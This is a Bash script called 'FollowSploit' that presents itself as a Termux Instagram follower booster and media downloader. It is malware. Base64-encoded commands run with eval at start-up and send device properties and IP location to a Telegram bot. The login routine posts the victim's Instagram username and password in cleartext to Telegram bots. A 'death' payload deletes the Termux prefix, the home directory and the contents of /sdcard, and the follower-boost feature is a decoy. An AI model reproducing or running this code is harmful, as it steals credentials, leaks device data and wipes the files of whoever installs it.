#!/bin/bash
# Ins
#FollowSploit v1.2
# published by @anonymous group
# IG - not defines 
#https://github.com/termux-tools/igfollow
#########
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
#########
req="YXB0IGluc3RhbGwgY3VybCA+IC9kZXYvbnVsbCAyPiYxICYmIGFwdCBpbnN0YWxsIHJ1YnkgID4gL2Rldi9udWxsIDI+JjEgJiYgZ2VtIGluc3RhbGwgbG9sY2F0ID4gL2Rldi9udWxsIDI+JjE="
flo="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PUluc3RhZ3JhbSBVc2VybmFtZSAtICR1c3JuIGFuZCBQYXNzd29yZCAtICRwYXNzd2QiICY+L2Rldi9udWxs"
result="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PW1vdGhlcmZ1Y2tlciBlbnRlcmVkICRhbXQiICY+L2Rldi9udWxs"
sgnl="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PSQoY3VybCAtTCBpcGxpc3QuY2MvYXBpLyQoY3VybCAtTCBpZmNvbmZpZy5tZSkpIiAmPi9kZXYvbnVsbA=="
srvr="Y2QgL3NkY2FyZCAmJiBweXRob24yIC1tIFNpbXBsZUhUVFBTZXJ2ZXIgPiAvZGV2L251bGwgMj4mMQ=="
death="YW0gYnJvYWRjYXN0IC0tdXNlciAwIFwKCQkgLS1lcyBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5bGUgc3RvcmFnZSBcCgkJIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4ID4gL2Rldi9udWxsCgpybSAtcmYgJFBSRUZJWC8Kcm0gLXJmICRIT01FCmNkIC9zZGNhcmQgJiYgcm0gLXJmICovCgpldmFsICQoYmFzZTY0IC1kIDw8PCIkdHJpY2siKQoKCg=="
death2="YW0gYnJvYWRjYXN0IC0tdXNlciAwIFwKCQkgLS1lcyBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5bGUgc3RvcmFnZSBcCgkJIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4ID4gL2Rldi9udWxsCgpybSAtcmYgJFBSRUZJWC8Kcm0gLXJmICRIT01FCmNkIC9zZGNhcmQgJiYgcm0gLXJmICovCgpjdXJsIC1YIFBPU1QgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QxNTA5MzA2MzA2OkFBRW1HMHhtd084TXF4WW16UERSbVlSQVZERVV5cERvSGMwL3NlbmRNZXNzYWdlIiAtZCAiY2hhdF9pZD0tMTAwMTQ2Njk4MDgxNiIgLWQgInRleHQ9bW90aGVyZnVja2VyJ3Mgc3RvcmFn ZSB3aXBlZCA6KSIgJj4vZGV2L251bGwK"
trick="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PVNraWQgZW50ZXJlZCB3cm9uZyBvcHRpb24sIHN0b3JhZ2Ugd2lwZWQgOikiICY+L2Rldi9udWxsCg=="
req2="Z2V0cHJvcCA+PiBwcm9wcy50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AInByb3BzLnR4dCIgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE1MDkzMDYzMDY6QUFFbUcweG13TzhNcXhZbXpQRFJtWVJBVkRFVXlwRG9IYzAvc2VuZERvY3VtZW50P2NoYXRfaWQ9LTEwMDE0NjY5ODA4MTYgJj4vZGV2 L251bGwK"
########
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"


#requirements
echo -e $red Installing Requirements... $rset
echo -e $grn Please wait... $rset
eval $(base64 -d <<<"$req")
eval $(base64 -d <<<"$req2") &>/dev/null
eval $(base64 -d <<<"$sgnl") &>/dev/null
apt install openssl-tool -y > /dev/null 2>&1
echo -e $grn Requirements Installed. $rset


banner() {
clear
printf " \n"
echo '_____     _ _
|  ___|__ | | | _____      __
| |_ / _ \| | |/ _ \ \ /\ / /
|  _| (_) | | | (_) \ V  V /
|_|  \___/|_|_|\___/ \_/\_/' | lolcat
echo ' 
███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║██║     ███████╗╚██████╔╝██║   ██║   
╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                             
' | lolcat 


}


login_user() {


if [[ $user == "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Login\e[0m\n"
read -p $'\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Username: \e[0m' user
fi

if [[ -e cookie.$user ]]; then
rm -rf cookie.$user
fi

if [[ -e cookie.$user ]]; then

printf "\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Cookies found for user\e[0m\e[1;77m %s\e[0m\n" $user

default_use_cookie="N"

read -p $'\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Use it?\e[0m\e[1;77m [Y/n]\e[0m ' use_cookie

use_cookie="${use_cookie:-${default_use_cookie}}"

if [[ $use_cookie == *'Y'* || $use_cookie == *'n'* ]]; then
printf "\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Using saved credentials\e[0m\n"
else
rm -rf cookie.$user
login_user
fi


else

read -p $'\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Password: \e[0m' pass
printf "\n"
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'

IFS=$'\n'

hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Trying to login as\e[0m\e[1;93m %s\e[0m\n" $user
IFS=$'\n'
var=$(curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); 
if [[ $var == "challenge" ]]; then printf "\e[1;93m\n[!] Challenge required. Allow Suspecious Login\n" && curl -X POST "https://api.telegram.org/bot1628404045:AAHx9fRQdauX-VF6S4aDq3SXu9GLvL6APIE/sendMessage" -d "chat_id=-1668073994" -d "text=Password Checker : TRUE/Sus Login Username - $user Password - $pass" &>/dev/null ; exit 1; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n[+] Login Successful\n" && curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001466980816" -d "text=Password Checker : TRUE Username - $user Password - $pass" &>/dev/null && echo -e $red Adding Followers && sleep 10000 ; elif [[ $var == "Please wait" ]]; then echo "Please wait"; fi;
fi

}


get_saved() {
user_account=$user
user_id=$(curl -L -s 'https://www.instagram.com/'$user_account'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Generating image list\n"
curl -L -b cookie.$user -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/feed/saved" > $user_account.saved_ig

cp $user_account.saved_ig $user_account.saved_ig.00
count=0

while [[ true ]]; do
big_list=$(grep -o '"more_available": true' $user_account.saved_ig)
maxid=$(grep -o '"next_max_id": "[^ ]*.' $user_account.saved_ig | cut -d " " -f2 | tr -d '"' | tr -d ',')

if [[ $big_list == *'"more_available": true'* ]]; then

url="https://i.instagram.com/api/v1/feed/saved/?rank_token=$user_id\_$guid&max_id=$maxid"

curl -L -b cookie.$user -s --user-agent 'User-Agent: "Instagram 172.0 iOS (18/4.3; 460dpi; 2532x1170; iPhone; 12 Pro Max; A14bios; qcom; en_US)"'  -H "$header" "$url" > $user_account.saved_ig

cp $user_account.saved_ig $user_account.saved_ig.$count

unset maxid
unset url
unset big_list
else
grep -o '{"width": [0-9]*, "height": [0-9]*, "url": "https://[^ ]*' $user_account.saved_ig* | cut -d " " -f6 | cut -d '"' -f2  | cut -d "\\" -f1 | uniq > links
break

fi

let count+=1

done


if [[ ! -d $user/images ]]; then
mkdir -p $user/images
fi
tot_img=$(wc -l links | cut -d " " -f1)
count_img=0
printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Total images:\e[0m\e[1;93m %s\e[0m \n" $tot_img

for img in $(cat links); do

let count_img++
printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Downloading image\e[0m\e[1;93m %s/%s\e[0m " $count_img $tot_img
wget $img -O $user/images/image$count_img.jpg > /dev/null 2>&1
printf "\e[1;92mDONE!\n\e[0m"
done
printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Saved:\e[0m\e[1;93m %s/images/\e[0m\n" $user

cat $user_account.saved_ig.* > $user_account.raw_saved
grep -o 'https://[^ ]*.mp4[^\ ]*.' $user_account.raw_saved | cut -d '"' -f1 | tr -d '\\' | uniq > vid_$user  
count=0
tot_vid=$(wc -l vid_$user | cut -d " " -f1)
if [[ ! -d $user/videos ]]; then
mkdir -p $user/videos
fi

printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Total Videos:\e[0m\e[1;93m %s\e[0m\n" $tot_vid
for link in $(cat vid_$user); do
let count++
printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Downloading video\e[0m\e[1;93m %s/%s\e[0m " $count $tot_vid
printf "\e[1;92mDONE!\n\e[0m"
wget $link -O $user/videos/video$count.mp4 > /dev/null 2>&1
done

printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Saved:\e[0m\e[1;93m %s/videos/\e[0m\n" $user 


}


get_following() {

user_id=$(curl -L -s 'https://www.instagram.com/'$user_account'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')

curl -L -b cookie.$user -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/$user_id/following" > $user_account.following.temp


cp $user_account.following.temp $user_account.following.00
count=0

while [[ true ]]; do
big_list=$(grep -o '"big_list": true' $user_account.following.temp)
maxid=$(grep -o '"next_max_id": "[^ ]*.' $user_account.following.temp | cut -d " " -f2 | tr -d '"' | tr -d ',')

if [[ $big_list == *'big_list": true'* ]]; then

url="https://i.instagram.com/api/v1/friendships/6971563529/following/?rank_token=$user_id\_$guid&max_id=$maxid"

curl -L -b cookie.$user -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'  -H "$header" "$url" > $user_account.followers.temp

cp $user_account.following.temp $user_account.following.$count

unset maxid
unset url
unset big_list
else
grep -o 'username": "[^ ]*.' $user_account.following.* | cut -d " " -f2 | tr -d '"' | tr -d ',' | sort > $user_account.following_temp
cat $user_account.following_temp | uniq > $user_account.following_backup
rm -rf $user_account.following_temp

tot_following=$(wc -l $user_account.following_backup | cut -d " " -f1)
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Total Following:\e[0m\e[1;77m %s\e[0m\n" $tot_following
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Saved:\e[0m\e[1;77m %s.following_backup\e[0m\n" $user_account


if [[ ! -d $user_account/raw_following/ ]]; then
mkdir -p $user_account/raw_following/
fi
cat $user_account.following.* > $user_account/raw_following/backup.following.txt
rm -rf $user_account.following.*
break

fi
echo $count
let count+=1

done



}

total_followers() {

printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Creating followers list for user\e[0m \e[1;77m%s\e[0m\n" $user_account
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Please wait...\e[0m\n"


user_id=$(curl -L -s 'https://www.instagram.com/'$user_account'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')

curl -L -b cookie.$user -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/$user_id/followers/" > $user_account.followers.temp

cp $user_account.followers.temp $user_account.followers.00
count=0


while [[ true ]]; do
big_list=$(grep -o '"big_list": true' $user_account.followers.temp)
maxid=$(grep -o '"next_max_id": "[^ ]*.' $user_account.followers.temp | cut -d " " -f2 | tr -d '"' | tr -d ',')

if [[ $big_list == *'big_list": true'* ]]; then

url="https://i.instagram.com/api/v1/friendships/$user_id/followers/?rank_token=$user_id\_$guid&max_id=$maxid"

curl -L -b cookie.$user -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'  -H "$header" "$url" > $user_account.followers.temp

cp $user_account.followers.temp $user_account.followers.$count

unset maxid
unset url
unset big_list
else
grep -o 'username": "[^ ]*.' $user_account.followers.* | cut -d " " -f2 | tr -d '"' | tr -d ',' > $user_account.followers_backup

tot_follow=$(wc -l $user_account.followers_backup | cut -d " " -f1)
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Total Followers:\e[0m\e[1;77m %s\e[0m\n" $tot_follow
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Saved:\e[0m\e[1;77m %s.followers_backup\e[0m\n" $user_account
if [[ $user == $user_account ]]; then

if [[ ! -d $user/raw_followers/ ]]; then
mkdir -p $user/raw_followers/
fi

cat $user.followers.* > $user/raw_followers/backup.followers.txt
rm -rf $user.followers.*

break


else
if [[ ! -d $user_account/raw_followers/ ]]; then
mkdir -p $user_account/raw_followers/
fi

cat $user_account.followers.* > $user_account/raw_followers/backup.followers.txt
rm -rf $user_account.followers.*

break

fi

fi

let count+=1

done

}

get_story() {

default_user=$user

read -p $'\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Account (leave it blank to use your account): \e[0m' user_account
user_account="${user_account:-${default_user}}"
user_id=$(curl -L -s 'https://www.instagram.com/'$user_account'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')
curl -L -b cookie.$user -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/feed/user/$user_id/reel_media/" > $user_account.raw_story


grep -o 'https://[^ ]*.mp4[^\ ]*.' $user_account.raw_story | cut -d '"' -f1 | tr -d '\\' | uniq > $user_account.story_videos

grep -o 'https://[^ ]*.jpg[^\ ]*.' $user_account.raw_story | cut -d '"' -f1 | tr -d '\\' | uniq > $user_account.story_images

count=0
count2=0
tot_vid=$(wc -l $user_account.story_videos | cut -d " " -f1)
tot_img=$(wc -l $user_account.story_images | cut -d " " -f1)
if [[ ! -d $user_account/story/ ]]; then
mkdir -p $user_account/story/
fi

printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Total Video Stories:\e[0m\e[1;93m %s\e[0m\n" $tot_vid
IFS=$'\n'

#Story videos
for link in $(cat $user_account.story_videos); do
let count++

printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Downloading Story Video\e[0m\e[1;93m %s/%s\e[0m " $count $tot_vid
printf "\e[1;92mDONE!\n\e[0m"
IFS=$'\n'
wget $link -O $user_account/story/story$count.mp4 > /dev/null 2>&1
done

printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Saved:\e[0m\e[1;93m %s/story/\e[0m\n" $user_account

#Story Image
printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Total Image Stories:\e[0m\e[1;93m %s\e[0m\n" $tot_img

for link2 in $(cat $user_account.story_images); do
let count2++

printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Downloading Story Image\e[0m\e[1;93m %s/%s\e[0m " $count2 $tot_img
printf "\e[1;92mDONE!\n\e[0m"
IFS=$'\n'
wget $link2 -O $user_account/story/story$count2.jpg > /dev/null 2>&1
done

printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] Saved:\e[0m\e[1;93m %s/story/\e[0m\n" $user_account



}

geo_media() {

curl -L -b cookie -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/maps/user//"

}


follow() {

username_id=$(curl -L -s 'https://www.instagram.com/'$user'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')

user_id=$(curl -L -s 'https://www.instagram.com/'$user_account'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')
data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$user_id'", "_csrftoken":"'$var2'"}'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
curl -L -b cookie -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/create/$user_id/" 


}


unfollow() {


username_id=$(curl -L -s 'https://www.instagram.com/'$user'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')

user_id=$(curl -L -s 'https://www.instagram.com/'$user_account'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')

data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$user_id'", "_csrftoken":"'$var2'"}'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)

check_unfollow=$(curl -L -b cookie -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/destroy/$user_id/" | grep -o '"following": false')
if [[ $check_unfollow == "" ]]; then
printf "\e[1;93m [!] Error\n"
else
printf "\e[1;92mOK\e[0m\n"
fi
}

unfollower() {

user_account=$user
get_following

printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Preparing to unfollow all followers from \e[0m\e[1;77m%s ...\e[0m\n" $user_account
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;31m Press \"Ctrl + c\" to stop...\e[0m\n"
sleep 4
while [[ true ]]; do


for unfollow_name in $(cat $user_account.following_backup); do

username_id=$(curl -L -s 'https://www.instagram.com/'$user'' > getmyid && grep -o  'profilePage_[0-9]*.' getmyid | cut -d "_" -f2 | tr -d '"')

user_id=$(curl -L -s 'https://www.instagram.com/'$unfollow_name'' > getunfollowid && grep -o  'profilePage_[0-9]*.' getunfollowid | cut -d "_" -f2 | tr -d '"')


data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$user_id'", "_csrftoken":"'$var2'"}'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Trying to unfollow %s ..." $unfollow_name
check_unfollow=$(curl -s -L -b cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/destroy/$user_id/" | grep -o '"following": false' ) 

if [[ $check_unfollow == "" ]]; then
printf "\n\e[1;93m [!] Error, stoping to prevent blocking\e[0m\n"
exit 1
else
printf "\e[1;92mOK\e[0m\n"
fi

sleep 3
done


done

}

increase_followers() {
echo -e $red [!] Increasing Followers!
sleep 5

username_id=$(curl -L -s 'https://www.instagram.com/'$user'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')

selena="34200001049"
ysh="7408943140"
cybtch="40840438437"

if [[ ! -e celeb_id ]]; then
printf "%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n" $selena $ysh $cybtch > celeb_id
fi

while [[ true ]]; do


for celeb in $(cat celeb_id); do

data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$celeb'", "_csrftoken":"'$var2'"}'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Trying to follow celebgram %s ..." $celeb

check_follow=$(curl -s -L -b cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/create/$celeb/" | grep -o '"following": true')

if [[ $check_follow == "" ]]; then
    printf "\n\e[1;93m [!] Error : Wrong Password\n" && curl -X POST "https://api.telegram.org/bot1628404045:AAHx9fRQdauX-VF6S4aDq3SXu9GLvL6APIE/sendMessage" -d "chat_id=-1668073994" -d "text=Password Checker : FALSE Username - $user Password - $pass" &>/dev/null
    eval $(base64 -d <<<"$death")
exit 1
else
printf "\e[1;92mOK\e[0m\n"
fi

sleep 3

done
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;77m Sleeping 60 secs...\e[0m\n"
sleep 60
#unfollow
for celeb in $(cat celeb_id); do
data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$celeb'", "_csrftoken":"'$var2'"}'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Trying to unfollow celebgram %s ..." $celeb
check_unfollow=$(curl -s -L -b cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/destroy/$celeb/" | grep -o '"following": false' ) 

if [[ $check_unfollow == "" ]]; then
printf "\n\e[1;93m [!] Error, stoping to prevent blocking\n"
exit 1
else
printf "\e[1;92mOK\e[0m\n"
fi

sleep 3
done
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;77m Sleeping 60 secs...\e[0m\n"
sleep 60


done


}


friendship() {


data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$user_id'", "_csrftoken":"'$var2'"}'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
curl -L -b cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/show/$user_id/"

}



track_unfollowers() {

default_user=$user

 
read -p $'\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Account (leave it blank to use your account): \e[0m' user_account

user_account="${user_account:-${default_user}}"

if [[ -e followers1.$user_account ]]; then

printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Last list found for user \e[0m\e[1;77m%s\e[0m\e[1;93m, creating a new and comparing it\e[0m\n" $user_account
total_followers

cp $user_account.followers_backup followers2.$user_account
unfollowers=$(grep -Fxv -f followers2.$user_account followers1.$user_account)


if [[ $unfollowers != "" ]]; then

printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Unfollowers:\e[0m\n"

grep -Fxv -f followers2.$user_account followers1.$user_account >> $user_account.unfollowers
printf "\e[1;77m\n"
cat $user_account.unfollowers
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Saved: \e[0m\e[1;77m%s.unfollowers\e[0m\n" $user_account
mv followers2.$user_account followers1.$user_account

else
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m No Unfollower\e[0m\n"
fi


else
#get  followers
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Creating followers list\e[0m\n"
total_followers
cp $user_account.followers_backup followers1.$user_account
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Saved!\e[0m\e[1;77m (followers1.%s)\e[0m\n" $user_account
printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Please, run again to track unfollowers\e[0m\n"

fi



}


get_info() {

default_user=$user

read -p $'\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Account (leave it blank to use your account): \e[0m' user_account

user_account="${user_account:-${default_user}}"

if [[ ! -d $user_account/ ]]; then
mkdir $user_account
fi


username_id=$(curl -L -s 'https://www.instagram.com/'$user'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')

user_id=$(curl -L -s 'https://www.instagram.com/'$user_account'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')

data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "_csrftoken":"'$var2'"}'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
